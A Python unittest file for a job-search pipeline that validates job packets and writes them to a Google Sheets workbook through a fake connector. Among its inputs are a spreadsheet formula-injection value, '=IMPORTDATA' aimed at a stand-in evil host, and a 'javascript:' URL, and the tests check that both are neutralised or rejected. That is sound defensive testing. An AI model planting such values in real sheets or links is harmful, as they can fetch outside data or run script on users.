import copy
from concurrent.futures import ThreadPoolExecutor
import json
from pathlib import Path
import tempfile
import unittest
import subprocess
import sys
import time

from job_search_ops import queue, sheets


WORKBOOK = "example-workbook"
STAMP = "2026-10-18T08:00:00+00:00"


def policies():
    main = {"id": "main", "version": "v1", "max_required_years": 2, "allow_unstated_years": True, "allowed_tiers": ["core", "senior_exception"], "forbidden_title_patterns": [r"(?i)\b(staff|principal|lead|manager)\b"]}
    blind = {"id": "blind", "version": "v1", "base_required_years": 2, "max_required_years": 3, "allow_unstated_years": True, "allowed_tiers": ["core", "stretch"], "forbidden_title_patterns": [r"(?i)\b(senior|staff|principal|lead|manager)\b"], "min_rating": 3.5}
    return {"email": main, "portal": main, "blind": blind}


def packet(source="portal", packet_id="run-1", job_key="example:req-1", event="event-1", observed_at=STAMP):
    link = "https://careers.example.com/jobs/" + job_key.split(":")[-1]
    evidence = {name: {"url": link, "quote": quote} for name, quote in {"identity": "Example Company, Software Engineer, Req 1", "requirements": "Bachelor's degree and 2 years of professional experience", "location": "New York City office", "availability": "Applications are open; Apply now"}.items()}
    job = {"job_key": job_key, "company": "Example Company", "title": "Software Engineer", "url": link, "source_job_id": job_key, "provider": "Official ATS", "location": "New York City", "experience": "2+ years", "level": "Mid", "target_fit": "Good", "fit_reason": "Verified backend role in selected location", "referral_hold": False, "qualification": {"decision": "QUALIFY", "tier": "core", "required_years": 2, "checked_at": STAMP, "evidence": evidence}, "sightings": [{"id": event, "observed_at": observed_at}]}
    if source == "blind":
        job.update(rating=4.0, rating_as_of="2026-10-01", rating_origin="user_supplied")
        job["qualification"].update(required_years=3, tier="stretch")
        job["qualification"]["evidence"]["requirements"]["quote"] = "Bachelor's degree and 3 years of professional experience"
        job["experience"] = "3+ years"
    return {"schema_version": 1, "packet_id": packet_id, "workbook_id": WORKBOOK, "source": source, "observed_at": observed_at, "policy": {"id": "blind" if source == "blind" else "main", "version": "v1", "source": source}, "jobs": [job], "coverage": []}


class NativeConnector:
    """Small fake of actual native CellData and the requests this writer emits."""
    def __init__(self, rows=20):
        self.raw = {"spreadsheetId": WORKBOOK, "properties": {"timeZone": "America/New_York"}, "sheets": [], "_cell_fields": sheets.CELL_FIELDS}
        for i, (name, headers) in enumerate(sheets.SCHEMAS.items()):
            count = max(rows, 12) if name == "Daily Summary" else rows
            cells = [{"values": []} for _ in range(count)]
            cells[3] = {"values": [{"userEnteredValue": {"stringValue": h}, "effectiveValue": {"stringValue": h}} for h in headers]}
            self.raw["sheets"].append({"properties": {"sheetId": 10 + i * 17, "title": name, "gridProperties": {"rowCount": count, "columnCount": len(headers)}}, "data": [{"startRow": 0, "startColumn": 0, "rowData": cells}]})
        self.refresh_ranges()

    def refresh_ranges(self):
        self.raw["_read_ranges"] = [f"'{s['properties']['title']}'!A1:{sheets.colname(s['properties']['gridProperties']['columnCount'] - 1)}{s['properties']['gridProperties']['rowCount']}" for s in self.raw["sheets"]]

    def tab(self, name):
        return next(s for s in self.raw["sheets"] if s["properties"]["title"] == name)

    def cell(self, name, row, field):
        col = sheets.SCHEMAS[name].index(field)
        values = self.tab(name)["data"][0]["rowData"][row]["values"]
        while len(values) <= col:
            values.append({})
        return values[col]

    def set(self, name, row, field, value):
        self.update(self.cell(name, row, field), {"userEnteredValue": sheets.native(value)})

    @staticmethod
    def update(cell, change):
        if "userEnteredValue" in change:
            value = copy.deepcopy(change["userEnteredValue"])
            cell["userEnteredValue"] = value
            if "formulaValue" in value:
                match = sheets.re.fullmatch(r'=HYPERLINK\("((?:[^"]|"")*)","Open job"\)', value["formulaValue"])
                if match:
                    cell["hyperlink"] = match[1].replace('""', '"')
                    cell["effectiveValue"] = {"stringValue": "Open job"}
                else:
                    cell["effectiveValue"] = {"numberValue": 0}
            else:
                cell["effectiveValue"] = value
                cell.pop("hyperlink", None)

    def snapshot(self):
        return copy.deepcopy(self.raw)

    def apply(self, requests):
        for request in requests:
            kind, action = next(iter(request.items()))
            bounds = action.get("range", action)
            tab = next(s for s in self.raw["sheets"] if s["properties"]["sheetId"] == bounds["sheetId"])
            if kind == "appendDimension":
                tab["properties"]["gridProperties"]["rowCount"] += action["length"]
                tab["data"][0]["rowData"].extend({"values": []} for _ in range(action["length"]))
            elif kind == "insertDimension":
                start, end = bounds["startIndex"], bounds["endIndex"]
                if start == 4:
                    # Google adjusts cross-sheet references when inserting before
                    # the first referenced data row. A later request must repair it.
                    title = tab["properties"]["title"]
                    prefix = "Jobs!" if title == "Jobs" else "'" + title + "'!"
                    for item in self.tab("Daily Summary")["data"][0]["rowData"]:
                        for cell in item["values"]:
                            entered = cell.get("userEnteredValue", {})
                            if "formulaValue" in entered:
                                entered["formulaValue"] = sheets.re.sub(sheets.re.escape(prefix) + r"([A-Z]+)5:", lambda m: prefix + m[1] + str(5 + end - start) + ":", entered["formulaValue"])
                tab["data"][0]["rowData"][start:start] = [{"values": []} for _ in range(end - start)]
                tab["properties"]["gridProperties"]["rowCount"] += end - start
            elif kind == "updateDimensionProperties":
                tab["hidden_columns"] = [bounds["startIndex"]]
            else:
                for row in range(bounds["startRowIndex"], bounds["endRowIndex"]):
                    values = tab["data"][0]["rowData"][row]["values"]
                    while len(values) < bounds["endColumnIndex"]:
                        values.append({})
                    for col in range(bounds["startColumnIndex"], bounds["endColumnIndex"]):
                        cell = values[col]
                        if kind == "updateCells":
                            self.update(cell, action["rows"][row - bounds["startRowIndex"]]["values"][col - bounds["startColumnIndex"]])
                        elif kind == "setDataValidation":
                            cell["dataValidation"] = action["rule"]
                        elif kind == "repeatCell":
                            for key, val in action["cell"].items():
                                cell.setdefault(key, {}).update(val) if isinstance(val, dict) else cell.update({key: val})
                        else:
                            raise AssertionError(kind)
        self.refresh_ranges()


class PipelineTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        queue.configure_policies(self.root, WORKBOOK, policies())
        self.connector = NativeConnector()

    def prepare(self, p=None):
        if p:
            queue.enqueue(self.root, p)
        return sheets.prepare(self.root, WORKBOOK, self.connector.snapshot(), "central")

    def save(self, p):
        journal = self.prepare(p)
        request = sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())
        self.connector.apply(request["requests"])
        receipt = sheets.verify_and_commit(self.root, journal["journal_id"], self.connector.snapshot())
        return journal, receipt

    def value(self, row, field, tab="Jobs"):
        return sheets.cellvalue(self.connector.cell(tab, row, field))

    def test_real_native_batch_readback_and_dynamic_sheet_ids(self):
        journal, receipt = self.save(packet())
        self.assertEqual(receipt["status"], "saved")
        self.assertEqual(self.value(4, "Job Key"), "example:req-1")
        self.assertEqual(self.value(4, "Seen Count"), 1)
        self.assertEqual(self.value(4, "Application Status"), "New")
        self.assertTrue(self.connector.cell("Jobs", 4, "Application Status")["dataValidation"]["strict"])
        self.assertEqual(self.connector.cell("Jobs", 4, "First Seen")["userEnteredFormat"]["numberFormat"]["type"], "DATE")
        self.assertEqual(queue.enqueue(self.root, packet())["status"], "done")
        self.assertEqual(queue.pending(self.root), [])
        self.assertEqual(sheets.verify_and_commit(self.root, journal["journal_id"], self.connector.snapshot()), receipt)

    def test_cross_source_blind_stretch_and_manual_fields(self):
        self.save(packet())
        self.connector.set("Jobs", 4, "Application Status", "Applied")
        self.connector.set("Jobs", 4, "Notes", "Keep my note")
        self.connector.set("Jobs", 4, "Referral Contact", "My contact")
        _, receipt = self.save(packet("blind", "blind-1", event="blind-event"))
        self.assertEqual(self.value(4, "Seen Count"), 2)
        self.assertEqual(self.value(4, "Application Status"), "Applied")
        self.assertEqual(self.value(4, "Notes"), "Keep my note")
        self.assertEqual(self.value(4, "Referral Contact"), "My contact")
        self.assertEqual(receipt["new_jobs"], [])
        self.assertEqual(self.value(5, "Qualification Tier", "Job Sources"), "stretch")
        self.assertEqual(len(sheets.Snapshot(self.connector.snapshot(), WORKBOOK).rows("Jobs")), 1)

    def test_same_batch_union_and_event_replay(self):
        queue.enqueue(self.root, packet())
        queue.enqueue(self.root, packet("blind", "blind-1", event="blind-1"))
        journal = self.prepare()
        self.connector.apply(sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())["requests"])
        sheets.verify_and_commit(self.root, journal["journal_id"], self.connector.snapshot())
        self.assertEqual(self.value(4, "Seen Count"), 2)
        replay = packet(packet_id="run-2")
        _, receipt = self.save(replay)
        self.assertEqual(self.value(4, "Seen Count"), 2)
        self.assertEqual(receipt["new_source_events"], 0)

    def test_out_of_order_keeps_first_seen_and_does_not_regress_last(self):
        self.save(packet())
        old_first, old_last = self.value(4, "First Seen"), self.value(4, "Last Seen")
        self.save(packet(packet_id="old-run", event="old-event", observed_at="2026-09-18T08:00:00Z"))
        self.assertEqual(self.value(4, "First Seen"), old_first)
        self.assertEqual(self.value(4, "Last Seen"), old_last)
        self.assertEqual(self.value(4, "Seen Count"), 2)

    def test_owner_conflict_never_stolen_by_age(self):
        self.prepare(packet())
        with self.assertRaisesRegex(queue.ProtocolError, "persistent owner"):
            sheets.prepare(self.root, WORKBOOK, self.connector.snapshot(), "another")
        with self.assertRaises(queue.ProtocolError):
            queue.release_claim(self.root, WORKBOOK, "central")

    def test_concurrent_enqueue_idempotent(self):
        with ThreadPoolExecutor(max_workers=4) as pool:
            list(pool.map(lambda _: queue.enqueue(self.root, packet()), range(8)))
        self.assertEqual(len(queue.pending(self.root)), 1)
        changed = packet()
        changed["jobs"][0]["title"] = "Changed"
        with self.assertRaisesRegex(queue.ProtocolError, "different bytes"):
            queue.enqueue(self.root, changed)

    def test_edit_before_write_requires_replan(self):
        self.save(packet())
        journal = self.prepare(packet(packet_id="run-2", event="event-2"))
        self.connector.set("Jobs", 4, "Notes", "Just edited")
        with self.assertRaisesRegex(queue.ProtocolError, "User edit"):
            sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())
        sheets.cancel_unattempted(self.root, journal["journal_id"], "central")
        new = self.prepare()
        self.assertNotEqual(new["journal_id"], journal["journal_id"])

    def test_timeout_after_success_reconciles_without_second_write(self):
        journal = self.prepare(packet())
        self.connector.apply(sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())["requests"])
        with self.assertRaisesRegex(queue.ProtocolError, "already attempted"):
            sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())
        self.assertEqual(sheets.reconcile(self.root, journal["journal_id"], self.connector.snapshot())["status"], "saved")
        self.assertEqual(self.value(4, "Seen Count"), 1)

    def test_timeout_before_write_has_explicit_retry_and_no_checkpoint(self):
        journal = self.prepare(packet())
        payload = sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())
        self.assertEqual(len(queue.pending(self.root)), 1)
        self.assertEqual(list((self.root / "state/writer/receipts").glob("*.json")), [])
        self.assertEqual(sheets.reconcile(self.root, journal["journal_id"], self.connector.snapshot())["status"], "awaiting_settlement")
        with self.assertRaises(queue.ProtocolError):
            sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())
        settled = {"journal_id": journal["journal_id"], "attempt_id": payload["attempt_id"], "kind": "native_terminal_failure", "verified_at": queue.now(), "response": {"error": {"code": 400, "message": "Invalid request rejected before execution"}}}
        self.assertEqual(sheets.reconcile(self.root, journal["journal_id"], self.connector.snapshot(), settled)["status"], "retryable")
        self.connector.apply(sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())["requests"])
        self.assertEqual(sheets.verify_and_commit(self.root, journal["journal_id"], self.connector.snapshot())["status"], "saved")

    def test_mixed_write_stays_conflict_and_queued(self):
        journal = self.prepare(packet())
        requests = sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())["requests"]
        # Partial source table only; no incomplete Jobs identity to parse.
        source_id = self.connector.tab("Job Sources")["properties"]["sheetId"]
        self.connector.apply([r for r in requests if r.get("updateCells", {}).get("range", {}).get("sheetId") == source_id])
        self.assertEqual(sheets.reconcile(self.root, journal["journal_id"], self.connector.snapshot())["status"], "conflict")
        self.assertEqual(len(queue.pending(self.root)), 1)
        with self.assertRaises(queue.ProtocolError):
            sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())

    def test_bad_effective_or_formatted_link_cannot_commit(self):
        for field in ("hyperlink", "effectiveFormat", "userEnteredFormat", "textFormatRuns"):
            with self.subTest(field=field):
                self.connector = NativeConnector()
                with tempfile.TemporaryDirectory() as tmp:
                    queue.configure_policies(tmp, WORKBOOK, policies())
                    queue.enqueue(tmp, packet())
                    j = sheets.prepare(tmp, WORKBOOK, self.connector.snapshot(), "central")
                    self.connector.apply(sheets.authorize_write(tmp, j["journal_id"], self.connector.snapshot())["requests"])
                    c = self.connector.cell("Jobs", 4, "Job Link")
                    wrong = "https://careers.example.com/jobs/other"
                    if field == "hyperlink":
                        c[field] = wrong
                    elif field == "textFormatRuns":
                        c[field] = [{"startIndex": 0, "format": {"link": {"uri": wrong}}}]
                    else:
                        c[field] = {"textFormat": {"link": {"uri": wrong}}}
                    with self.assertRaises(queue.ProtocolError):
                        sheets.verify_and_commit(tmp, j["journal_id"], self.connector.snapshot())
                    self.assertEqual(len(queue.pending(tmp)), 1)

    def test_actual_wrapped_native_chunks_and_missing_coverage(self):
        raw = self.connector.snapshot()
        metadata = copy.deepcopy(raw)
        for tab in metadata["sheets"]:
            tab.pop("data")
        combined = sheets.combine_snapshot({"structuredContent": metadata}, [{"structuredContent": raw}], raw["_read_ranges"])
        self.assertEqual(sheets.Snapshot(combined, WORKBOOK).state(), sheets.Snapshot(raw, WORKBOOK).state())
        ranges = []
        for r in raw["_read_ranges"]:
            sheet, cells = r.split("!")
            end = cells.split(":")[1]
            col = sheets.re.sub(r"\d", "", end)
            ranges.extend([sheet + "!A1:" + col + "10", sheet + "!A11:" + col + "20"])
        combined["_read_ranges"] = ranges
        sheets.Snapshot(combined, WORKBOOK)
        combined["_read_ranges"] = ranges[:-1]
        with self.assertRaisesRegex(queue.ProtocolError, "Incomplete"):
            sheets.Snapshot(combined, WORKBOOK)

    def test_policy_binding_and_unsafe_inputs(self):
        for mutation in (lambda p: p.update(workbook_id="other"), lambda p: p["policy"].update(version="unapproved"), lambda p: p["jobs"][0]["qualification"].update(required_years=5), lambda p: p["jobs"][0].update(url="javascript:alert(1)"), lambda p: p["jobs"][0]["qualification"]["evidence"]["requirements"].update(quote=""), lambda p: p["jobs"][0]["qualification"].update(required_years=float("nan"))):
            p = packet()
            mutation(p)
            with self.assertRaises(queue.ProtocolError):
                queue.enqueue(self.root, p)
        blind = packet("blind")
        blind["jobs"][0]["title"] = "Senior Software Engineer"
        with self.assertRaisesRegex(queue.ProtocolError, "title"):
            queue.enqueue(self.root, blind)

    def test_formula_like_source_text_stays_literal(self):
        p = packet()
        p["jobs"][0]["company"] = '=IMPORTDATA("https://evil.example")'
        self.save(p)
        self.assertIn("stringValue", self.connector.cell("Jobs", 4, "Company")["userEnteredValue"])

    def test_enabled_sources_and_blind_tier_boundaries(self):
        queue.configure_policies(self.root, WORKBOOK, {"blind": policies()["blind"]})
        with self.assertRaisesRegex(queue.ProtocolError, "enabled approved"):
            queue.enqueue(self.root, packet())
        wrong_core = packet("blind")
        wrong_core["jobs"][0]["qualification"]["tier"] = "core"
        with self.assertRaisesRegex(queue.ProtocolError, "base experience ceiling"):
            queue.enqueue(self.root, wrong_core)
        wrong_stretch = packet("blind")
        wrong_stretch["jobs"][0]["qualification"]["required_years"] = 2
        with self.assertRaisesRegex(queue.ProtocolError, "above its base"):
            queue.enqueue(self.root, wrong_stretch)
        self.assertEqual(queue.enqueue(self.root, packet("blind"))["status"], "pending")

    def test_same_batch_first_seen_is_minimum_across_sources(self):
        queue.enqueue(self.root, packet(observed_at="2026-10-17T08:00:00Z"))
        queue.enqueue(self.root, packet("blind", "another", event="other", observed_at="2026-10-15T08:00:00Z"))
        journal = sheets.prepare(self.root, WORKBOOK, self.connector.snapshot(), "central")
        self.connector.apply(sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())["requests"])
        sheets.verify_and_commit(self.root, journal["journal_id"], self.connector.snapshot())
        self.assertEqual(self.value(4, "First Seen"), sheets.serial("2026-10-15T08:00:00Z"))
        self.assertEqual(self.value(4, "Last Seen"), sheets.serial("2026-10-17T08:00:00Z"))
        self.assertEqual(self.value(4, "Seen Count"), 2)

    def test_partial_coverage_does_not_close_existing_role(self):
        self.save(packet())
        p = packet("blind", "coverage-only")
        p["jobs"] = []
        p["coverage"] = [{"company_key": "example", "company": "Example Company", "scope": "NYC", "status": "partial", "checked_at": STAMP, "observed_jobs": None, "qualified_jobs": None, "notes": "Pagination failed"}]
        self.save(p)
        self.assertEqual(self.value(4, "Application Status"), "New")
        self.assertEqual(self.value(4, "Seen Count"), 1)
        self.assertEqual(self.value(4, "Status", "Rated Search Coverage"), "partial")

    def test_brief_receipts_are_independent_no_implicit_send(self):
        _, first = self.save(packet())
        brief = queue.prepare_brief(self.root, "brief-1")
        self.assertEqual(brief["receipt_ids"], [first["receipt_id"]])
        _, second = self.save(packet("blind", "later-import", "example:req-2", "later-event"))
        self.assertEqual(queue.prepare_brief(self.root, "brief-1")["receipt_ids"], brief["receipt_ids"])
        with self.assertRaises(queue.ProtocolError):
            queue.prepare_brief(self.root, "brief-2")
        snapshot = self.root / "public.json"
        snapshot.write_text(json.dumps({"roles": first["new_jobs"]}))
        body = self.root / "body.txt"
        rendered = "Example Company — Software Engineer https://careers.example.com/jobs/req-1"
        body.write_text(rendered)
        intent = {"recipient": "person@example.com", "subject": "Daily report", "snapshot_path": str(snapshot), "plain_body_path": str(body)}
        queue.mark_brief_sending(self.root, "brief-1", intent)
        with self.assertRaises(queue.ProtocolError):
            queue.mark_brief_sending(self.root, "brief-1", intent)
        readback = {"id": "message-1", "internal_date": str(int(time.time() * 1000)), "label_ids": ["SENT"], "payload": {"headers": [{"name": "To", "value": "person@example.com"}, {"name": "Subject", "value": "Daily report"}], "mime_type": "text/plain", "body": {"content": rendered}}}
        with self.assertRaises(queue.ProtocolError):
            queue.confirm_brief_delivery(self.root, "brief-1", {"message_id": "invented", "sent_readback_ref": "asserted.json", "verified_at": STAMP})
        wrong = copy.deepcopy(readback)
        wrong["payload"]["body"]["content"] = "Different report"
        with self.assertRaises(queue.ProtocolError):
            queue.confirm_brief_delivery(self.root, "brief-1", {"native_sent_readback": wrong, "verified_at": queue.now()})
        stale = copy.deepcopy(readback)
        stale["internal_date"] = "1000"
        with self.assertRaisesRegex(queue.ProtocolError, "predates"):
            queue.confirm_brief_delivery(self.root, "brief-1", {"native_sent_readback": stale, "verified_at": queue.now()})
        queue.confirm_brief_delivery(self.root, "brief-1", {"native_sent_readback": {"structuredContent": readback}, "verified_at": queue.now()})
        self.assertEqual(queue.prepare_brief(self.root, "brief-2")["receipt_ids"], [second["receipt_id"]])
        self.assertNotIn("send_email", json.dumps(second))

    def test_partial_insertion_is_conflict_not_double_insertion(self):
        self.connector = NativeConnector(rows=5)
        self.save(packet())
        j = self.prepare(packet(packet_id="run2", job_key="example:req-2", event="event2"))
        requests = sheets.authorize_write(self.root, j["journal_id"], self.connector.snapshot())["requests"]
        self.connector.apply([r for r in requests if "insertDimension" in r])
        self.assertEqual(sheets.reconcile(self.root, j["journal_id"], self.connector.snapshot())["status"], "conflict")
        with self.assertRaises(queue.ProtocolError):
            sheets.authorize_write(self.root, j["journal_id"], self.connector.snapshot())

    def test_chat_only_brief_uses_exact_native_final_response(self):
        _, receipt = self.save(packet())
        queue.prepare_brief(self.root, "chat-daily")
        snapshot = self.root / "public.json"
        snapshot.write_text(json.dumps({"roles": receipt["new_jobs"]}))
        body = self.root / "body.md"
        rendered = "Example Company — Software Engineer [Apply](https://careers.example.com/jobs/req-1)"
        body.write_text(rendered)
        queue.mark_brief_sending(self.root, "chat-daily", {"channel": "chat", "thread_id": "central", "snapshot_path": str(snapshot), "chat_body_path": str(body)})
        raw = {"thread": {"id": "central"}, "turns": [{"status": "completed", "completedAt": int(time.time()), "items": [{"type": "agentMessage", "phase": "final_answer", "id": "final-1", "text": rendered}]}]}
        wrong = copy.deepcopy(raw)
        wrong["turns"][0]["items"][0]["text"] += " altered"
        with self.assertRaises(queue.ProtocolError):
            queue.confirm_brief_delivery(self.root, "chat-daily", {"native_chat_readback": wrong, "verified_at": queue.now()})
        stale = copy.deepcopy(raw)
        stale["turns"][0]["completedAt"] = 1
        with self.assertRaises(queue.ProtocolError):
            queue.confirm_brief_delivery(self.root, "chat-daily", {"native_chat_readback": stale, "verified_at": queue.now()})
        delivered = queue.confirm_brief_delivery(self.root, "chat-daily", {"native_chat_readback": {"content": [{"type": "text", "text": json.dumps(raw)}]}, "verified_at": queue.now()})
        self.assertEqual(delivered["delivery_evidence"]["message_id"], "final-1")
        self.assertEqual(queue.prepare_brief(self.root, "next-chat")["receipt_ids"], [])
        queue.mark_brief_sending(self.root, "next-chat", {"channel": "chat", "thread_id": "central", "snapshot_path": str(snapshot), "chat_body_path": str(body)})
        with self.assertRaisesRegex(queue.ProtocolError, "already acknowledged"):
            queue.confirm_brief_delivery(self.root, "next-chat", {"native_chat_readback": raw, "verified_at": queue.now()})

    def test_insertions_restore_and_verify_summary_formulas(self):
        self.connector.update(self.connector.cell("Daily Summary", 4, "Value"), {"userEnteredValue": {"formulaValue": "=COUNTA(Jobs!C5:C)"}})
        journal = self.prepare(packet())
        requests = sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())["requests"]
        inserts = [r for r in requests if "insertDimension" in r]
        self.assertTrue(all(not r["insertDimension"]["inheritFromBefore"] for r in inserts))
        self.connector.apply(inserts)
        self.assertEqual(self.value(4, "Value", "Daily Summary"), "=COUNTA(Jobs!C6:C)")
        self.connector.apply([r for r in requests if "insertDimension" not in r])
        self.assertEqual(self.value(4, "Value", "Daily Summary"), "=COUNTA(Jobs!C5:C)")
        broken = self.connector.snapshot()
        summary = next(t for t in broken["sheets"] if t["properties"]["title"] == "Daily Summary")
        summary["data"][0]["rowData"][4]["values"][1]["userEnteredValue"]["formulaValue"] = "=COUNTA(Jobs!C6:C)"
        with self.assertRaisesRegex(queue.ProtocolError, "Readback differs"):
            sheets.verify_and_commit(self.root, journal["journal_id"], broken)
        sheets.verify_and_commit(self.root, journal["journal_id"], self.connector.snapshot())

    def test_concurrent_human_append_is_shifted_never_overwritten(self):
        journal = self.prepare(packet())
        request = sheets.authorize_write(self.root, journal["journal_id"], self.connector.snapshot())
        self.connector.set("Jobs", 4, "Company", "Human's new row")
        self.connector.set("Jobs", 4, "Notes", "Do not overwrite")
        self.connector.apply(request["requests"])
        self.assertEqual(self.value(5, "Company"), "Human's new row")
        self.assertEqual(self.value(5, "Notes"), "Do not overwrite")
        with self.assertRaises(queue.ProtocolError):
            sheets.verify_and_commit(self.root, journal["journal_id"], self.connector.snapshot())
        self.assertEqual(len(queue.pending(self.root)), 1)

    def test_display_date_uses_profile_timezone_and_retains_source_timestamp(self):
        queue.configure_policies(self.root, WORKBOOK, policies(), timezone="America/New_York")
        self.save(packet(observed_at="2026-10-19T02:00:00Z"))
        self.assertEqual(self.value(4, "First Seen"), sheets.serial("2026-10-18T12:00:00Z"))
        self.assertEqual(self.value(4, "Observed At", "Job Sources"), "2026-10-19T02:00:00Z")

    def test_wrong_unique_saved_link_rejected_against_private_receipt(self):
        self.save(packet())
        cell = self.connector.cell("Jobs", 4, "Job Link")
        self.connector.update(cell, {"userEnteredValue": sheets.hyperlink("https://careers.example.com/jobs/wrong-but-unique")})
        with self.assertRaisesRegex(queue.ProtocolError, "independent accepted link"):
            self.prepare(packet(packet_id="next", event="next-event"))

    def test_approved_policy_and_packet_frozen_before_attempt(self):
        j = self.prepare(packet())
        entry_path = next((self.root / "state/queue/pending").glob("*.json"))
        entry = queue.read(entry_path)
        entry["packet"]["jobs"][0]["title"] = "Modified after review"
        queue.atomic(entry_path, entry)
        with self.assertRaisesRegex(queue.ProtocolError, "evidence changed"):
            sheets.authorize_write(self.root, j["journal_id"], self.connector.snapshot())

    def test_command_line_snapshot_enqueue_save_and_receipt(self):
        def write(name, data):
            path = self.root / name
            path.write_text(json.dumps(data))
            return str(path)
        def cli(*args):
            process = subprocess.run([sys.executable, "-B", "-m", "job_search_ops", *args], capture_output=True, text=True)
            self.assertEqual(process.returncode, 0, process.stderr)
            return json.loads(process.stdout)
        raw = self.connector.snapshot()
        meta = copy.deepcopy(raw)
        for tab in meta["sheets"]:
            tab.pop("data")
        assembled = cli("snapshot", "--metadata", write("metadata.json", meta), "--reads", write("reads.json", [{"request": {"ranges": raw["_read_ranges"], "cell_fields": sheets.CELL_FIELDS, "spreadsheet_id": WORKBOOK}, "response": {"structuredContent": raw}}]))
        snapshot_file = write("snapshot.json", assembled)
        bootstrap = cli("bootstrap", "--snapshot", snapshot_file)
        self.assertEqual(bootstrap["spreadsheet_id"], WORKBOOK)
        for p in (packet(), packet("blind", "blind-1", event="blind-event")):
            queued = cli("enqueue", "--root", str(self.root), "--packet", write(p["source"] + ".json", p))
            self.assertEqual(queued["status"], "pending")
        plan = cli("prepare", "--root", str(self.root), "--workbook", WORKBOOK, "--snapshot", snapshot_file, "--owner", "central")
        request = cli("authorize-write", "--root", str(self.root), "--journal", plan["journal_id"], "--snapshot", snapshot_file)
        self.connector.apply(request["requests"])
        saved = cli("commit", "--root", str(self.root), "--journal", plan["journal_id"], "--snapshot", write("readback.json", self.connector.snapshot()))
        self.assertEqual(saved["status"], "saved")
        self.assertEqual(len(saved["new_jobs"]), 1)
        self.assertEqual(saved["new_source_events"], 2)
        brief = cli("brief-prepare", "--root", str(self.root), "--brief", "daily")
        self.assertEqual(brief["receipt_ids"], [saved["receipt_id"]])


if __name__ == "__main__":
    unittest.main()
